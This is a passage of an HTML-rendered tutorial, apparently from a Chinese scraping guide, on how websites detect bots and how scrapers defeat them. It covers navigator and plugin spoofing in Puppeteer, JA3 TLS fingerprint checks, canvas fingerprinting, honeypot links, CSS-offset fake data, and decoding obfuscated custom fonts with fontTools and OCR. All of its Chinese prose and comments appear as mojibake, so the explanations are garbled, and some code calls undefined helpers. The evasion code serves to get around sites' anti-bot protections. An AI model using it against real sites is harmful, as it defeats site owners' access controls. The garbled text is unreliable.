<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nx">chrome</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">runtime</span><span class="o">:</span><span class="w"> </span><span class="p">{}</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">});</span>

<span class="c1">// ä¼ªé€ æ’ä»¶</span>
<span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">evaluateOnNewDocument</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nx">navigator</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;plugins&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">get</span><span class="o">:</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">[</span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="mf">3</span><span class="p">,</span><span class="w"> </span><span class="mf">4</span><span class="p">,</span><span class="w"> </span><span class="mf">5</span><span class="p">]</span>
<span class="w">    </span><span class="p">});</span>
<span class="p">});</span>
</code></pre>
      </div>

      <hr />

      <h3 id="3-åŸºäº-tls-æŒ‡çº¹çš„æ£€æµ‹">3. åŸºäº TLS æŒ‡çº¹çš„æ£€æµ‹</h3>

      <p><strong>åŸç†</strong>: å®¢æˆ·ç«¯åœ¨ TLS æ¡æ‰‹æ—¶å‘é€çš„ Client Hello åŒ…å«å¤§é‡æŒ‡çº¹ä¿¡æ¯ï¼ˆJA3ï¼‰ã€‚</p>

      <p><strong>æ£€æµ‹ä»£ç </strong> (æœåŠ¡ç«¯):</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">scapy.all</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span><span class="w"> </span><span class="nf">extract_ja3</span><span class="p">(</span><span class="n">packet</span><span class="p">):</span>
    <span class="c1"># æå– TLS Client Hello</span>
    <span class="c1"># ç”Ÿæˆ JA3 æŒ‡çº¹</span>
    <span class="n">ja3</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">version</span><span class="si">}</span><span class="s2">,</span><span class="si">{</span><span class="n">ciphers</span><span class="si">}</span><span class="s2">,</span><span class="si">{</span><span class="n">extensions</span><span class="si">}</span><span class="s2">,</span><span class="si">{</span><span class="n">curves</span><span class="si">}</span><span class="s2">,</span><span class="si">{</span><span class="n">formats</span><span class="si">}</span><span class="s2">&quot;</span>
    <span class="n">ja3_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">ja3</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

    <span class="c1"># æ£€æŸ¥æ˜¯å¦åœ¨é»‘åå•ä¸­</span>
    <span class="k">if</span> <span class="n">ja3_hash</span> <span class="ow">in</span> <span class="n">BLACKLIST_JA3</span><span class="p">:</span>
        <span class="k">return</span> <span class="s2">&quot;Bot detected&quot;</span>
</code></pre>
      </div>

      <p><strong>å¯¹æŠ—ç­–ç•¥</strong>:</p>

      <ul>
        <li>ä½¿ç”¨ <code>curl-impersonate</code> æ¨¡æ‹ŸçœŸå®æµè§ˆå™¨ TLS æŒ‡çº¹</li>
        <li>ä½¿ç”¨çœŸå®æµè§ˆå™¨ï¼ˆPuppeteer/Playwrightï¼‰</li>
        <li>è¯¦è§ <a href="#04-Advanced-Recipes-tls-fingerprinting">TLS æŒ‡çº¹è¯†åˆ«</a></li>
      </ul>

      <hr />

      <h3 id="4-åŸºäº-canvaswebgl-æŒ‡çº¹">4. åŸºäº Canvas/WebGL æŒ‡çº¹</h3>

      <p><strong>æ£€æµ‹ä»£ç </strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">getCanvasFingerprint</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">canvas</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;canvas&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">canvas</span><span class="p">.</span><span class="nx">getContext</span><span class="p">(</span><span class="s1">&#39;2d&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">ctx</span><span class="p">.</span><span class="nx">textBaseline</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;top&#39;</span><span class="p">;</span>
<span class="w">    </span><span class="nx">ctx</span><span class="p">.</span><span class="nx">font</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;14px Arial&#39;</span><span class="p">;</span>
<span class="w">    </span><span class="nx">ctx</span><span class="p">.</span><span class="nx">fillText</span><span class="p">(</span><span class="s1">&#39;fingerprint&#39;</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">canvas</span><span class="p">.</span><span class="nx">toDataURL</span><span class="p">();</span>
<span class="p">}</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">fingerprint</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getCanvasFingerprint</span><span class="p">();</span>
<span class="c1">// å‘é€åˆ°æœåŠ¡å™¨éªŒè¯</span>
</code></pre>
      </div>

      <p><strong>å¯¹æŠ—ç­–ç•¥</strong>: è¯¦è§ <a href="#04-Advanced-Recipes-canvas-fingerprinting">Canvas æŒ‡çº¹æŠ€æœ¯</a></p>

      <hr />

      <h3 id="5-èœœç½æŠ€æœ¯-honeypot">5. èœœç½æŠ€æœ¯ (Honeypot)</h3>

      <p><strong>åŸç†</strong>: åœ¨é¡µé¢ä¸­éšè—å¯¹ç”¨æˆ·ä¸å¯è§ã€ä½†çˆ¬è™«ä¼šæŠ“å–çš„é“¾æ¥ã€‚</p>

      <p><strong>å®ç°</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="cm">&lt;!-- éšè—é“¾æ¥ --&gt;</span>
<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;/trap&quot;</span> <span class="na">style</span><span class="o">=</span><span class="s">&quot;display:none;&quot;</span><span class="p">&gt;</span>Hidden Link<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>

<span class="cm">&lt;!-- CSS éšè— --&gt;</span>
<span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
<span class="p">.</span><span class="nc">trap</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">position</span><span class="p">:</span><span class="w"> </span><span class="kc">absolute</span><span class="p">;</span><span class="w"> </span><span class="k">left</span><span class="p">:</span><span class="w"> </span><span class="mi">-9999</span><span class="kt">px</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;/trap&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;trap&quot;</span><span class="p">&gt;</span>Trap<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</code></pre>
      </div>

      <p><strong>æœåŠ¡ç«¯å¤„ç†</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/trap&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">honeypot</span><span class="p">():</span>
    <span class="c1"># è®°å½•è®¿é—®è€… IPï¼Œæ ‡è®°ä¸ºçˆ¬è™«</span>
    <span class="n">blacklist</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span><span class="p">)</span>
    <span class="k">return</span> <span class="s2">&quot;Gotcha!&quot;</span>
</code></pre>
      </div>

      <p><strong>å¯¹æŠ—ç­–ç•¥</strong>:</p>

      <ul>
        <li>åªæå–å¯è§å†…å®¹</li>
        <li>æ£€æŸ¥å…ƒç´ çš„ CSS æ ·å¼ï¼ˆ<code>display</code>, <code>visibility</code>, <code>opacity</code>ï¼‰</li>
      </ul>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">isVisible</span><span class="p">(</span><span class="nx">element</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">element</span><span class="p">.</span><span class="nx">offsetWidth</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">&amp;&amp;</span>
<span class="w">           </span><span class="nx">element</span><span class="p">.</span><span class="nx">offsetHeight</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">&amp;&amp;</span>
<span class="w">           </span><span class="nx">getComputedStyle</span><span class="p">(</span><span class="nx">element</span><span class="p">).</span><span class="nx">visibility</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="s1">&#39;hidden&#39;</span><span class="p">;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <hr />

      <h3 id="6-css-åçˆ¬æŠ€æœ¯">6. CSS åçˆ¬æŠ€æœ¯</h3>

      <h4 id="61-css-åç§»éšè—">6.1 CSS åç§»éšè—</h4>

      <p><strong>åŸç†</strong>: ä½¿ç”¨ CSS æ ·å¼å°†çœŸå®å†…å®¹åç§»åˆ°ä¸å¯è§åŒºåŸŸï¼Œé¡µé¢ä¸Šæ˜¾ç¤ºçš„æ˜¯ä¼ªé€ æ•°æ®ã€‚</p>

      <p><strong>å®ç°ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
<span class="p">.</span><span class="nc">price</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">position</span><span class="p">:</span><span class="w"> </span><span class="kc">relative</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">.</span><span class="nc">price</span><span class="w"> </span><span class="p">.</span><span class="nc">real</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">position</span><span class="p">:</span><span class="w"> </span><span class="kc">absolute</span><span class="p">;</span>
<span class="w">    </span><span class="k">left</span><span class="p">:</span><span class="w"> </span><span class="mi">-9999</span><span class="kt">px</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">.</span><span class="nc">price</span><span class="w"> </span><span class="p">.</span><span class="nc">fake</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">position</span><span class="p">:</span><span class="w"> </span><span class="kc">relative</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>

<span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;price&quot;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;real&quot;</span><span class="p">&gt;</span>Â¥199<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;fake&quot;</span><span class="p">&gt;</span>Â¥9999<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</code></pre>
      </div>

      <p><strong>ç‰¹ç‚¹</strong>:</p>

      <ul>
        <li>é¡µé¢æºç ä¸­æ˜¾ç¤ºå‡æ•°æ®</li>
        <li>çœŸå®æ•°æ®é€šè¿‡ CSS å®šä½éšè—</li>
        <li>æ­£å¸¸ç”¨æˆ·çœ‹åˆ°çš„æ˜¯çœŸå®æ•°æ®</li>
      </ul>

      <p><strong>å¯¹æŠ—ç­–ç•¥</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">selenium</span><span class="w"> </span><span class="kn">import</span> <span class="n">webdriver</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">selenium.webdriver.common.by</span><span class="w"> </span><span class="kn">import</span> <span class="n">By</span>

<span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Chrome</span><span class="p">()</span>
<span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">)</span>

<span class="c1"># è·å–å…ƒç´ </span>
<span class="n">element</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">By</span><span class="o">.</span><span class="n">CLASS_NAME</span><span class="p">,</span> <span class="s1">&#39;price&#39;</span><span class="p">)</span>

<span class="c1"># è·å–æ¸²æŸ“åçš„å¯è§æ–‡æœ¬ï¼ˆä¼šè·å–åˆ°çœŸå®æ•°æ®ï¼‰</span>
<span class="n">visible_text</span> <span class="o">=</span> <span class="n">element</span><span class="o">.</span><span class="n">text</span>

<span class="c1"># æˆ–ä½¿ç”¨ JavaScript è·å–è®¡ç®—åçš„æ ·å¼</span>
<span class="n">script</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">var element = arguments[0];</span>
<span class="s2">var style = window.getComputedStyle(element);</span>
<span class="s2">if (style.display !== &#39;none&#39; &amp;&amp;</span>
<span class="s2">    style.visibility !== &#39;hidden&#39; &amp;&amp;</span>
<span class="s2">    style.opacity !== &#39;0&#39; &amp;&amp;</span>
<span class="s2">    parseInt(style.left) &gt; -1000) {</span>
<span class="s2">    return element.innerText;</span>
<span class="s2">}</span>
<span class="s2">return null;</span>
</code></pre>
      </div>

      <h4 id="62-å­—ä½“åçˆ¬æŠ€æœ¯">6.2 å­—ä½“åçˆ¬æŠ€æœ¯</h4>

      <p><strong>åŸç†</strong>: é€šè¿‡è‡ªå®šä¹‰å­—ä½“æ–‡ä»¶ï¼ˆ@font-faceï¼‰ï¼Œå°†é¡µé¢æ–‡æœ¬å­—ç¬¦æ˜ å°„åˆ°å­—ä½“æ–‡ä»¶ä¸­çš„ä¸åŒå­—å½¢ï¼Œä½¿å¾—çˆ¬è™«æŠ“å–åˆ°çš„æ–‡å­—ä¸å®é™…æ˜¾ç¤ºçš„æ–‡å­—ä¸ä¸€è‡´ã€‚</p>

      <p><strong>å…¸å‹æ¡ˆä¾‹</strong>: çŒ«çœ¼ç”µå½±ã€å¤§ä¼—ç‚¹è¯„ã€58 åŒåŸã€æ±½è½¦ä¹‹å®¶ã€å¤©çœ¼æŸ¥ã€èµ·ç‚¹ä¸­æ–‡ç½‘</p>

      <p><strong>å®ç°æœºåˆ¶</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="cm">&lt;!-- HTML ä¸­æ˜¾ç¤ºçš„æ˜¯ä¹±ç æˆ–ç‰¹æ®Šç¼–ç  --&gt;</span>
<span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;rating&quot;</span><span class="p">&gt;</span><span class="ni">&amp;#xe601;&amp;#xe602;&amp;#xe603;</span><span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>

<span class="cm">&lt;!-- CSS å¼•å…¥è‡ªå®šä¹‰å­—ä½“ --&gt;</span>
<span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
<span class="p">@</span><span class="k">font-face</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nt">font-family</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;CustomFont&#39;</span><span class="o">;</span>
<span class="w">    </span><span class="nt">src</span><span class="o">:</span><span class="w"> </span><span class="nt">url</span><span class="o">(</span><span class="s1">&#39;/fonts/custom_12345.woff&#39;</span><span class="o">)</span><span class="w"> </span><span class="nt">format</span><span class="o">(</span><span class="s1">&#39;woff&#39;</span><span class="o">);</span>
<span class="p">}</span>
<span class="p">.</span><span class="nc">rating</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">font-family</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;CustomFont&#39;</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre>
      </div>

      <p><strong>å­—ä½“æ–‡ä»¶ç»“æ„</strong>:</p>

      <pre><code>WOFF å­—ä½“æ–‡ä»¶
â”œâ”€â”€ cmap è¡¨ (å­—ç¬¦æ˜ å°„è¡¨)
â”‚   â”œâ”€â”€ &amp;#xe601; â†’ "8"
â”‚   â”œâ”€â”€ &amp;#xe602; â†’ "."
â”‚   â””â”€â”€ &amp;#xe603; â†’ "5"
â”œâ”€â”€ glyf è¡¨ (å­—å½¢è½®å»“)
â”‚   â”œâ”€â”€ glyph_001 (æ•°å­— 8 çš„è½®å»“)
â”‚   â”œâ”€â”€ glyph_002 (ç‚¹å·çš„è½®å»“)
â”‚   â””â”€â”€ glyph_003 (æ•°å­— 5 çš„è½®å»“)
</code></pre>

      <p><strong>ç ´è§£æ–¹æ³•</strong>:</p>

      <p><strong>æ–¹æ³• 1: å­—ä½“æ–‡ä»¶è§£æ</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">fontTools.ttLib</span><span class="w"> </span><span class="kn">import</span> <span class="n">TTFont</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>

<span class="c1"># 1. ä»é¡µé¢æå–å­—ä½“æ–‡ä»¶ URL</span>
<span class="k">def</span><span class="w"> </span><span class="nf">extract_font_url</span><span class="p">(</span><span class="n">html</span><span class="p">):</span>
    <span class="n">pattern</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;url\([&quot;</span><span class="se">\&#39;</span><span class="s1">]?(/fonts/[^&quot;</span><span class="se">\&#39;</span><span class="s1">]+\.woff[^&quot;</span><span class="se">\&#39;</span><span class="s1">]*)[&quot;</span><span class="se">\&#39;</span><span class="s1">]?\)&#39;</span>
    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">html</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="k">if</span> <span class="n">match</span> <span class="k">else</span> <span class="kc">None</span>

<span class="c1"># 2. ä¸‹è½½å­—ä½“æ–‡ä»¶</span>
<span class="n">font_url</span> <span class="o">=</span> <span class="s1">&#39;https://example.com/fonts/custom.woff&#39;</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">font_url</span><span class="p">)</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;custom.woff&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>

<span class="c1"># 3. è§£æå­—ä½“æ–‡ä»¶</span>
<span class="n">font</span> <span class="o">=</span> <span class="n">TTFont</span><span class="p">(</span><span class="s1">&#39;custom.woff&#39;</span><span class="p">)</span>

<span class="c1"># 4. æå–å­—ç¬¦æ˜ å°„</span>
<span class="n">cmap</span> <span class="o">=</span> <span class="n">font</span><span class="o">.</span><span class="n">getBestCmap</span><span class="p">()</span>  <span class="c1"># è·å–æœ€ä½³å­—ç¬¦æ˜ å°„è¡¨</span>

<span class="c1"># 5. æå–å­—å½¢åæ ‡</span>
<span class="k">def</span><span class="w"> </span><span class="nf">get_glyph_outline</span><span class="p">(</span><span class="n">font</span><span class="p">,</span> <span class="n">glyph_name</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;è·å–å­—å½¢è½®å»“åæ ‡&quot;&quot;&quot;</span>
    <span class="n">glyf_table</span> <span class="o">=</span> <span class="n">font</span><span class="p">[</span><span class="s1">&#39;glyf&#39;</span><span class="p">]</span>
    <span class="n">glyph</span> <span class="o">=</span> <span class="n">glyf_table</span><span class="p">[</span><span class="n">glyph_name</span><span class="p">]</span>
    <span class="k">if</span> <span class="n">glyph</span><span class="o">.</span><span class="n">isComposite</span><span class="p">():</span>
        <span class="k">return</span> <span class="kc">None</span>  <span class="c1"># è·³è¿‡å¤åˆå­—å½¢</span>
    <span class="n">coordinates</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">glyph</span><span class="p">,</span> <span class="s1">&#39;coordinates&#39;</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="ow">in</span> <span class="n">glyph</span><span class="o">.</span><span class="n">coordinates</span><span class="p">:</span>
            <span class="n">coordinates</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">coordinates</span>

<span class="c1"># 6. å»ºç«‹å­—å½¢ä¸çœŸå®å­—ç¬¦çš„æ˜ å°„</span>
<span class="n">font_map</span> <span class="o">=</span> <span class="p">{}</span>
<span class="k">for</span> <span class="n">unicode_val</span><span class="p">,</span> <span class="n">glyph_name</span> <span class="ow">in</span> <span class="n">cmap</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
    <span class="n">outline</span> <span class="o">=</span> <span class="n">get_glyph_outline</span><span class="p">(</span><span class="n">font</span><span class="p">,</span> <span class="n">glyph_name</span><span class="p">)</span>
    <span class="c1"># é€šè¿‡æ¯”å¯¹åæ ‡è¯†åˆ«çœŸå®å­—ç¬¦</span>
    <span class="c1"># è¿™é‡Œéœ€è¦é¢„å…ˆå»ºç«‹æ ‡å‡†å­—å½¢åº“</span>
    <span class="n">real_char</span> <span class="o">=</span> <span class="n">recognize_char_by_outline</span><span class="p">(</span><span class="n">outline</span><span class="p">)</span>
    <span class="n">font_map</span><span class="p">[</span><span class="nb">chr</span><span class="p">(</span><span class="n">unicode_val</span><span class="p">)]</span> <span class="o">=</span> <span class="n">real_char</span>

<span class="nb">print</span><span class="p">(</span><span class="n">font_map</span><span class="p">)</span>
<span class="c1"># {&#39;\ue601&#39;: &#39;8&#39;, &#39;\ue602&#39;: &#39;.&#39;, &#39;\ue603&#39;: &#39;5&#39;}</span>

<span class="c1"># 7. è§£å¯†æ–‡æœ¬</span>
<span class="k">def</span><span class="w"> </span><span class="nf">decrypt_text</span><span class="p">(</span><span class="n">encrypted_text</span><span class="p">,</span> <span class="n">font_map</span><span class="p">):</span>
    <span class="n">decrypted</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">encrypted_text</span><span class="p">:</span>
        <span class="n">decrypted</span> <span class="o">+=</span> <span class="n">font_map</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">char</span><span class="p">,</span> <span class="n">char</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">decrypted</span>

<span class="n">encrypted</span> <span class="o">=</span> <span class="s1">&#39;&amp;#xe601;&amp;#xe602;&amp;#xe603;&#39;</span>  <span class="c1"># HTML å®ä½“</span>
<span class="n">decrypted</span> <span class="o">=</span> <span class="n">decrypt_text</span><span class="p">(</span><span class="n">encrypted</span><span class="p">,</span> <span class="n">font_map</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">decrypted</span><span class="p">)</span>  <span class="c1"># &quot;8.5&quot;</span>
</code></pre>
      </div>

      <p><strong>æ–¹æ³• 2: OCR è¯†åˆ«ï¼ˆé’ˆå¯¹åŠ¨æ€å­—ä½“ï¼‰</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">selenium</span><span class="w"> </span><span class="kn">import</span> <span class="n">webdriver</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">PIL</span><span class="w"> </span><span class="kn">import</span> <span class="n">Image</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">pytesseract</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">io</span><span class="w"> </span><span class="kn">import</span> <span class="n">BytesIO</span>

<span class="k">def</span><span class="w"> </span><span class="nf">ocr_screenshot</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">selector</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;æˆªå›¾å¹¶ OCR è¯†åˆ«&quot;&quot;&quot;</span>
    <span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Chrome</span><span class="p">()</span>
    <span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

    <span class="c1"># å®šä½å…ƒç´ </span>
    <span class="n">element</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">By</span><span class="o">.</span><span class="n">CSS_SELECTOR</span><span class="p">,</span> <span class="n">selector</span><span class="p">)</span>

    <span class="c1"># æˆªå–å…ƒç´ æˆªå›¾</span>
    <span class="n">screenshot</span> <span class="o">=</span> <span class="n">element</span><span class="o">.</span><span class="n">screenshot_as_png</span>
    <span class="n">image</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">screenshot</span><span class="p">))</span>

    <span class="c1"># OCR è¯†åˆ«</span>
    <span class="n">text</span> <span class="o">=</span> <span class="n">pytesseract</span><span class="o">.</span><span class="n">image_to_string</span><span class="p">(</span><span class="n">image</span><span class="p">,</span> <span class="n">lang</span><span class="o">=</span><span class="s1">&#39;chi_sim+eng&#39;</span><span class="p">)</span>

    <span class="n">driver</span><span class="o">.</span><span class="n">quit</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</code></pre>
      </div>

      <p><strong>æ–¹æ³• 3: å­—å½¢ç›¸ä¼¼åº¦åŒ¹é…</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">numpy</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">np</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">fontTools.pens.recordingPen</span><span class="w"> </span><span class="kn">import</span> <span class="n">RecordingPen</span>

<span class="k">def</span><span class="w"> </span><span class="nf">calculate_similarity</span><span class="p">(</span><span class="n">outline1</span><span class="p">,</span> <span class="n">outline2</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;è®¡ç®—ä¸¤ä¸ªå­—å½¢è½®å»“çš„ç›¸ä¼¼åº¦&quot;&quot;&quot;</span>
    <span class="c1"># å°†åæ ‡åºåˆ—è½¬æ¢ä¸ºå‘é‡</span>
    <span class="n">vec1</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">array</span><span class="p">(</span><span class="n">outline1</span><span class="p">)</span><span class="o">.</span><span class="n">flatten</span><span class="p">()</span>
    <span class="n">vec2</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">array</span><span class="p">(</span><span class="n">outline2</span><span class="p">)</span><span class="o">.</span><span class="n">flatten</span><span class="p">()</span>

    <span class="c1"># å½’ä¸€åŒ–</span>
    <span class="n">vec1</span> <span class="o">=</span> <span class="n">vec1</span> <span class="o">/</span> <span class="n">np</span><span class="o">.</span><span class="n">linalg</span><span class="o">.</span><span class="n">norm</span><span class="p">(</span><span class="n">vec1</span><span class="p">)</span>
    <span class="n">vec2</span> <span class="o">=</span> <span class="n">vec2</span> <span class="o">/</span> <span class="n">np</span><span class="o">.</span><span class="n">linalg</span><span class="o">.</span><span class="n">norm</span><span class="p">(</span><span class="n">vec2</span><span class="p">)</span>

    <span class="c1"># è®¡ç®—ä½™å¼¦ç›¸ä¼¼åº¦</span>
    <span class="n">similarity</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">dot</span><span class="p">(</span><span class="n">vec1</span><span class="p">,</span> <span class="n">vec2</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">similarity</span>

<span class="c1"># å»ºç«‹æ ‡å‡†å­—å½¢åº“ï¼ˆéœ€æå‰å‡†å¤‡ï¼‰</span>
<span class="n">standard_glyphs</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;0&#39;</span><span class="p">:</span> <span class="p">[(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">20</span><span class="p">),</span> <span class="p">(</span><span class="mi">30</span><span class="p">,</span> <span class="mi">20</span><span class="p">),</span> <span class="o">...</span><span class="p">],</span>
